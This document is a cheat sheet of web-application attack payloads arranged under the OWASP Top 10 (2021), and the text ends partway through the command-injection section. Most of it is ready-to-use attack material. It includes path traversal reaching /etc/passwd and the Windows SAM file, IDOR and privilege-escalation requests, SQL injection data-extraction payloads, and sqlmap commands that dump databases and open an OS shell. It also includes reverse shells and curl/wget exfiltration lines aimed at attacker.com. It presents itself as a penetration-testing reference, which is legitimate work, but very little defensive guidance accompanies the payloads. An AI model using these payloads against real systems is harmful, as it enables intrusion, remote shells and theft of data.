# OWASP Top 10 Web Application Vulnerabilities - Complete Guide

## OWASP Top 10 (2021)

1. **A01:2021 - Broken Access Control**
2. **A02:2021 - Cryptographic Failures**
3. **A03:2021 - Injection**
4. **A04:2021 - Insecure Design**
5. **A05:2021 - Security Misconfiguration**
6. **A06:2021 - Vulnerable and Outdated Components**
7. **A07:2021 - Identification and Authentication Failures**
8. **A08:2021 - Software and Data Integrity Failures**
9. **A09:2021 - Security Logging and Monitoring Failures**
10. **A10:2021 - Server-Side Request Forgery (SSRF)**

---

## A01:2021 - Broken Access Control

### Description
Users can access resources or perform actions outside their intended permissions.

### Common Vulnerabilities

**1. Insecure Direct Object References (IDOR)**
```bash
# Access other user's data
http://target.com/api/user/123/profile
http://target.com/api/user/124/profile  # Try other user IDs

# Download other user's files
http://target.com/download?file=invoice_123.pdf
http://target.com/download?file=invoice_124.pdf

# Modify other user's data
PUT /api/user/123/email
{"email": "attacker@evil.com"}
```

**2. Path Traversal**
```bash
# Access sensitive files
http://target.com/download?file=../../../../etc/passwd
http://target.com/download?file=..\..\..\..\windows\system32\config\sam

# URL encoding
http://target.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding
http://target.com/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

**3. Missing Function Level Access Control**
```bash
# Access admin functions as regular user
POST /api/admin/deleteUser
POST /api/admin/createUser
GET /admin/dashboard

# Change HTTP method
GET /api/user/123 → DELETE /api/user/123
```

**4. Horizontal Privilege Escalation**
```bash
# Manipulate user ID in requests
POST /api/changePassword
{"userId": 123, "newPassword": "hacked"}  # Change to userId: 124

# Cookie manipulation
Cookie: userId=123  # Change to userId=124
```

**5. Vertical Privilege Escalation**
```bash
# Add admin parameter
POST /api/register
{"username": "attacker", "password": "pass", "isAdmin": true}

# Manipulate role
PUT /api/user/profile
{"role": "admin"}
```

### Testing Tools
```bash
# Burp Suite - Autorize extension
# Test access control across different user roles

# OWASP ZAP - Access Control Testing
zap-cli quick-scan -s all http://target.com

# Custom scripts
# Test all endpoints with different user privileges
```

---

## A02:2021 - Cryptographic Failures

### Description
Failures related to cryptography leading to exposure of sensitive data.

### Common Issues

**1. Weak Encryption**
```bash
# Check for weak SSL/TLS
sslscan target.com
testssl.sh target.com
nmap --script ssl-enum-ciphers -p 443 target.com

# Look for:
- SSLv2, SSLv3, TLS 1.0, TLS 1.1
- Weak ciphers (RC4, DES, 3DES)
- No Perfect Forward Secrecy
```

**2. Sensitive Data Exposure**
```bash
# Check for exposed sensitive files
http://target.com/.git/
http://target.com/.env
http://target.com/config.php
http://target.com/database.yml
http://target.com/.aws/credentials
http://target.com/id_rsa

# API keys in JavaScript
curl http://target.com/main.js | grep -i "api_key\|apikey\|api-key"

# Hardcoded credentials
curl http://target.com/config.js | grep -i "password\|secret\|token"
```

**3. Insecure Storage**
```bash
# Check for plaintext passwords in database
# Check for reversible encryption
# Check for weak hashing (MD5, SHA1)

# Password storage should use:
- bcrypt
- scrypt
- Argon2
- PBKDF2
```

---

## A03:2021 - Injection

### 1. SQL Injection

**Detection:**
```bash
# Error-based
' OR '1'='1
" OR "1"="1
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1'/*

# Boolean-based
' AND 1=1--
' AND 1=2--

# Time-based
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '00:00:05'--
```

**Exploitation:**
```bash
# Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Extract database name
' UNION SELECT database()--
' UNION SELECT schema_name FROM information_schema.schemata--

# Extract table names
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

# Extract column names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# Extract data
' UNION SELECT username,password FROM users--
```

**SQLMap Automation:**
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Cookie-based
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"

# Dump database
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
```

### 2. Command Injection

**Detection:**
```bash
# Basic payloads
; whoami
| whoami
|| whoami
& whoami
&& whoami
` whoami `
$( whoami )

# URL encoded
%3B%20whoami
%7C%20whoami
```

**Exploitation:**
```bash
# Reverse shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc attacker.com 4444 -e /bin/bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Data exfiltration
; curl http://attacker.com/$(cat /etc/passwd | base64)
; wget http://attacker.com/$(whoami)
```
